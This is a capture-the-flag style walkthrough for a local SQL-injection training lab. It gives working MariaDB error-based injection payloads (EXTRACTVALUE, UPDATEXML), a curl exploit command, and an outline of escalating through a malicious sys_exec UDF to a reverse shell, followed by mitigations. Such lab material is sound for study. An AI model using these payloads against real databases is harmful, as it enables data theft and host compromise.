<h4>Step 1: Identify the Blind-ish Behavior</h4>
<p>
    The application only shows "Found X entries" or "No entries found": never the actual data.
    But raw error messages ARE displayed, giving us an error-based extraction channel.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Behavior</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>LOGIN<br>
        <span class="prompt">SQL: </span>SELECT COUNT(*) as cnt FROM system_logs WHERE action = 'LOGIN'<br><br>
        <span class="prompt">Output: </span><strong>Result:</strong> Found <strong>1</strong> log entries matching that action.
    </div>
</div>

<h4>Step 2: Confirm Error Display</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span>MariaDB Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1<br>
        <span class="prompt">// Errors are displayed -- this is our extraction channel</span>
    </div>
</div>

<h4>Step 3: Enumerate Tables via EXTRACTVALUE Error</h4>
<p>
    <code>EXTRACTVALUE()</code> raises an XPATH syntax error that includes the evaluated data.
    Use it to leak table names from <code>information_schema</code>.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -<br><br>
        <span class="prompt">Error: </span>MariaDB Error: XPATH syntax error: '<strong>~system_logs,udf_secrets</strong>'
    </div>
</div>

<h4>Step 4: Extract Flag via EXTRACTVALUE</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. EXTRACTVALUE Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM udf_secrets LIMIT 1))) -- -<br><br>
        <span class="prompt">Error: </span>MariaDB Error: XPATH syntax error: '<strong>~FLAG{ma_sys_3x3c_udf_rc3}</strong>'
    </div>
</div>

<h4>Step 5: Alternative. UPDATEXML</h4>
<p>
    <code>UPDATEXML()</code> also forces data into XPATH error messages. Same result, different function.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. UPDATEXML Alternative</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND UPDATEXML(1, CONCAT(0x7e, (SELECT secret_value FROM udf_secrets LIMIT 1)), 1) -- -<br><br>
        <span class="prompt">Error: </span>MariaDB Error: XPATH syntax error: '<strong>~FLAG{ma_sys_3x3c_udf_rc3}</strong>'
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the secret value and paste it into the verification form:
    <code>FLAG{ma_sys_3x3c_udf_rc3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab6" \<br> --data-urlencode "action=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM udf_secrets LIMIT 1))) -- -"<br><br>
        <span class="prompt">Result: </span>MariaDB Error: XPATH syntax error: '~<strong>FLAG{ma_sys_3x3c_udf_rc3}</strong>'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> When an application hides query results but shows error messages,
    <code>EXTRACTVALUE()</code> and <code>UPDATEXML()</code> are the go-to error-based extraction
    techniques for MariaDB/MySQL. Both force data into XPATH syntax errors. The
    <code>lib_mysqludf_sys</code> library provides <code>sys_exec()</code> and <code>sys_eval()</code>
    UDFs that execute OS commands as the database service user. The attack chain is:
    (1) write a malicious .so file to the plugin directory via <code>INTO DUMPFILE</code>,
    (2) <code>CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'</code>,
    (3) <code>SELECT sys_exec('reverse shell command')</code>.
    Mitigate by: restricting <code>FILE</code> privilege, setting <code>secure_file_priv</code>,
    and removing write access to the plugin directory.
</div>
